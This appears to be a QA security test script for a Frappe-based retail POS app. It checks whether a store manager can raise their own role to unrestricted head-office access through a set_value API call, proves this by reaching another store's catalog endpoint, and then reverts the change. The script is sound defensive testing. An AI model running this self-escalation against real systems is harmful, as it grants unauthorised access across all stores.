import sys, json
sys.path.insert(0, "/home/claude/awanz/e2e/qa")
from harness import Sess, sess, summ, PERSONAS
adm = sess("admin")
MU = "ok.mingo.manager@cloudchaserz.example"

def roles_of(u):
    r = adm.get("frappe.client.get", doctype="User", name=u)
    return sorted([x["role"] for x in r.json().get("message",{}).get("roles",[])])
def assoc_role(u):
    return adm.get("frappe.client.get_value", doctype="AWANZ Associate",
                   filters=json.dumps({"name":u}), fieldname="role").json().get("message",{}).get("role")

baseline_roles = roles_of(MU)
baseline_ar = assoc_role(MU)
print("baseline manager User roles:", baseline_roles)
print("baseline AWANZ Associate.role:", baseline_ar)

m = Sess(PERSONAS["manager"])
print("\n=== Z1: Manager sets OWN AWANZ Associate.role = 'HeadOffice' (self-escalate to unrestricted) ===")
r = m.post("frappe.client.set_value", doctype="AWANZ Associate", name=MU, fieldname="role", value="HeadOffice")
print("  set_value http:", summ(r)[:120])
now_ar = assoc_role(MU)
now_roles = roles_of(MU)
gained = "AWANZ Head Office" in now_roles and "AWANZ Head Office" not in baseline_roles
print("  AWANZ Associate.role now:", now_ar)
print("  manager User roles now:", now_roles)
print("  >>> GAINED AWANZ Head Office (UNRESTRICTED all-store):", gained)

# If escalated, prove unrestricted access with a fresh session hitting another store's endpoint
if gained:
    m2 = Sess(PERSONAS["manager"])
    rr = m2.get("maison_pos.api.catalog.bootstrap", boutique="OK-ETUL")
    print("  proof: OK-ETUL catalog.bootstrap as escalated manager ->", rr.status_code, "(was 403 before)")

print("\n=== REVERT ===")
# reset AWANZ Associate.role
adm.post("frappe.client.set_value", doctype="AWANZ Associate", name=MU, fieldname="role", value=baseline_ar)
# remove any roles not in baseline (the sync hook only adds)
extra = [x for x in roles_of(MU) if x not in baseline_roles]
if extra:
    adm.resource(f"User/{MU}", method="PUT", json={"roles":[{"role":x} for x in baseline_roles]})
print("  AWANZ Associate.role restored:", assoc_role(MU))
print("  manager User roles restored:", roles_of(MU), " == baseline:", roles_of(MU)==baseline_roles)
